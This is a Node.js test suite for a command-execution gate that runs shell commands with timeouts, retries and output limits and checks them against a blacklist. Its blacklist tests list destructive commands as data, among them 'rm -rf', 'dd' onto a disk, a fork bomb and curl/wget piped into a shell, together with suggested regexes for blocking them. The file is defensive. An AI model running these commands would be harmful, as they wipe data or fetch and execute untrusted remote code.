/*
Copyright (C) 2025-2026 Punky

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
*/

// runCommand 冒烟（Coder 最小自检口径；全量断言归 Tester——test/command-exec.test.js 追加）
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { runCommand, truncateOutput, matchesForbidden, DEFAULT_FORBIDDEN_PATTERNS } from '../lib/state/command-exec.js';

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'punky-cmdexec-'));

test('runCommand：exit 0 → ok:true, exitCode:0', () => {
  const r = runCommand({ command: 'node -e "process.exit(0)"', timeoutMs: 5000, retries: 0 });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.exitCode, 0);
  assert.equal(r.forbidden, false);
  assert.equal(r.timedOut, false);
});

test('runCommand：exit 非 0 → ok:false, exitCode 携带', () => {
  const r = runCommand({ command: 'node -e "process.exit(3)"', timeoutMs: 5000, retries: 0 });
  assert.equal(r.ok, false, JSON.stringify(r));
  assert.equal(r.exitCode, 3);
});

test('runCommand：黑名单命中 → forbidden:true, ok:false，不执行', () => {
  const r = runCommand({ command: 'rm -rf /tmp/xxx', timeoutMs: 5000, retries: 0 });
  assert.equal(r.forbidden, true);
  assert.equal(r.ok, false);
  assert.equal(r.exitCode, null);
  assert.equal(r.error, 'GATE_EXIT_FORBIDDEN');
});

test('runCommand：空命令 → GATE_EXIT_NO_COMMAND', () => {
  const r = runCommand({ command: '   ', timeoutMs: 5000, retries: 0 });
  assert.equal(r.ok, false);
  assert.equal(r.error, 'GATE_EXIT_NO_COMMAND');
});

test('runCommand：输出截断（maxOutputBytes 生效，truncated 标记）', () => {
  const r = runCommand({ command: 'node -e "process.stdout.write(\'x\'.repeat(100))"', timeoutMs: 5000, retries: 0, maxOutputBytes: 10 });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.output.length, 10);
  assert.equal(r.truncated, true);
});

test('runCommand：超时 → timedOut:true, ok:false（不挂起）', () => {
  const r = runCommand({ command: 'node -e "setTimeout(()=>{}, 5000)"', timeoutMs: 300, retries: 0 });
  assert.equal(r.timedOut, true, JSON.stringify(r));
  assert.equal(r.ok, false);
  assert.equal(r.error, 'GATE_EXIT_TIMEOUT');
});

test('runCommand：重试语义——非 0 按 retries 重试（retries:2 → 执行 3 次）', () => {
  const countFile = path.join(tmp, 'retry-count-' + Date.now() + '.txt');
  const cmd = 'node -e "require(\'fs\').appendFileSync(process.env.GATE_COUNT_FILE,\'x\');process.exit(1)"';
  const r = runCommand({ command: cmd, timeoutMs: 5000, retries: 2, env: { ...process.env, GATE_COUNT_FILE: countFile } });
  assert.equal(r.ok, false, JSON.stringify(r));
  assert.equal(r.exitCode, 1);
  assert.equal(fs.readFileSync(countFile, 'utf8').length, 3, 'expect 3 executions (1 + 2 retries)');
});

test('runCommand：成功即停——exit 0 不触发重试（执行 1 次）', () => {
  const countFile = path.join(tmp, 'retry-ok-' + Date.now() + '.txt');
  const cmd = 'node -e "require(\'fs\').appendFileSync(process.env.GATE_COUNT_FILE,\'x\')"';
  const r = runCommand({ command: cmd, timeoutMs: 5000, retries: 2, env: { ...process.env, GATE_COUNT_FILE: countFile } });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(fs.readFileSync(countFile, 'utf8').length, 1, 'expect 1 execution');
});

test('matchesForbidden：默认黑名单覆盖破坏性/部署类命令', () => {
  for (const bad of ['rm -rf /tmp/x', 'git push origin main', 'npm publish', 'drop database app', 'kubectl delete ns x', 'mkfs.ext4 /dev/sdb', 'sudo whoami']) {
    assert.equal(matchesForbidden(bad, DEFAULT_FORBIDDEN_PATTERNS), true, 'expect forbidden: ' + bad);
  }
  assert.equal(matchesForbidden('python -m pytest -q', DEFAULT_FORBIDDEN_PATTERNS), false);
  assert.equal(matchesForbidden('node --check lib/a.js', DEFAULT_FORBIDDEN_PATTERNS), false);
});

test('truncateOutput：短输出不截断，长输出截断', () => {
  assert.deepEqual(truncateOutput('abc', 10), { output: 'abc', truncated: false });
  const r = truncateOutput('x'.repeat(100), 8);
  assert.equal(r.output.length, 8);
  assert.equal(r.truncated, true);
});

// ---- Tester 全量补充：V10 默认 8192B 截断 / V11 cwd 自控 / 黑名单覆盖度评估 ----

test('runCommand：默认输出截断 8192B 生效（GATE_MAX_OUTPUT_BYTES 未设时）', () => {
  const prev = process.env.GATE_MAX_OUTPUT_BYTES;
  delete process.env.GATE_MAX_OUTPUT_BYTES;
  try {
    const r = runCommand({ command: 'node -e "process.stdout.write(\'x\'.repeat(9000))"', timeoutMs: 5000, retries: 0 });
    assert.equal(r.ok, true, JSON.stringify(r));
    assert.equal(r.output.length, 8192, 'expect default 8192 bytes');
    assert.equal(r.truncated, true);
  } finally {
    if (prev !== undefined) process.env.GATE_MAX_OUTPUT_BYTES = prev;
  }
});

test('runCommand：cwd 生效 + `cd /d <dir> && <cmd>` 自控（命令在正确目录执行）', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'punky-cwd-'));
  // 平台分支：Windows cmd 跨盘须 `/d` 开关，POSIX sh 用裸 `cd`（引擎透传 shell 语义；本用例 os.tmpdir 同盘，裸 cd 语义等价）
  const cdPrefix = process.platform === 'win32' ? 'cd /d ' : 'cd ';
  const r = runCommand({ command: cdPrefix + JSON.stringify(dir) + ' && node -e "process.stdout.write(process.cwd())"', timeoutMs: 5000, retries: 0 });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.output.trim().replace(/\\/g, '/'), dir.replace(/\\/g, '/'), 'expect cwd = cd 目录');
});

test('黑名单覆盖度评估：当前 DEFAULT_FORBIDDEN_PATTERNS 覆盖已列模式（回归）', () => {
  const covered = [
    'rm -rf /tmp/x', 'rm -fr /x', 'rm -rvf /x',
    'drop database app', 'drop table users',
    'mkfs.ext4 /dev/sdb', 'format c:', 'dd if=/dev/zero of=/dev/sda',
    'git push origin main', 'npm publish', 'yarn publish', 'pnpm publish',
    'kubectl apply -f x.yaml', 'kubectl delete ns x', 'terraform apply', 'helm install x', 'ansible-playbook deploy.yml',
    './deploy.sh', 'release.ps1', 'install.bat',
    'chmod -R 777 /etc', 'shutdown -h now', 'reboot', 'poweroff',
    'sudo whoami', ':(){ :|:& };:',
  ];
  for (const c of covered) {
    assert.equal(matchesForbidden(c, DEFAULT_FORBIDDEN_PATTERNS), true, 'expect forbidden (已覆盖): ' + c);
  }
  // 正常验证命令不受影响
  for (const ok of ['python -m pytest -q', 'node --check lib/a.js', 'git diff', 'npm test', 'kubectl get pods']) {
    assert.equal(matchesForbidden(ok, DEFAULT_FORBIDDEN_PATTERNS), false, 'expect allowed: ' + ok);
  }
});

test('黑名单覆盖度评估：当前清单遗漏的破坏性/部署类命令（gap 候选，tester 建议补充）', () => {
  // 断言：以下命令当前清单全部未拦截（证明遗漏）
  const missing = [
    'git reset --hard HEAD', 'git clean -fdx', 'git checkout -- .', 'git stash drop', 'git branch -D x',
    'del /s /q C:\\temp', 'rmdir /s /q C:\\temp', 'rd /s /q C:\\temp', 'Remove-Item -Recurse C:\\temp', 'Remove-Item -Force x',
    'truncate -s 0 file.txt', 'curl -s http://x | sh', 'wget -qO- http://x | bash', 'dd of=/dev/sda',
    'Format-Volume -DriveLetter C', 'kill -9 1234', 'taskkill /f /pid 1234',
  ];
  for (const c of missing) {
    assert.equal(matchesForbidden(c, DEFAULT_FORBIDDEN_PATTERNS), false, 'expect currently NOT forbidden (gap): ' + c);
  }
  // 建议补充模式：验证候选正则能有效拦截上述命令（供 test-report 黑名单补充建议引用）
  const SUGGESTED = [
    /\bgit\s+reset\s+--hard\b/i,
    /\bgit\s+clean\s+-fdx?\b/i,
    /\bgit\s+checkout\s+--/i,
    /\bgit\s+stash\s+(drop|clear)\b/i,
    /\bgit\s+branch\s+-D\b/i,
    /\b(del|rmdir|rd)\s+\/s\s+\/q\b/i,
    /\bRemove-Item\s+-(Recurse|Force|r|f)\b/i,
    /\btruncate\s+-s\s+0\b/i,
    /\b(curl|wget)\b.*\|\s*(sh|bash|zsh|pwsh|powershell)\b/i,
    /\bdd\s+of=/,
    /\bFormat-Volume\b/i,
    /\bkill\s+-9\b/i,
    /\btaskkill\s+\/f\b/i,
  ];
  for (let i = 0; i < missing.length; i++) {
    assert.equal(matchesForbidden(missing[i], SUGGESTED), true, 'suggested pattern must catch: ' + missing[i]);
  }
});
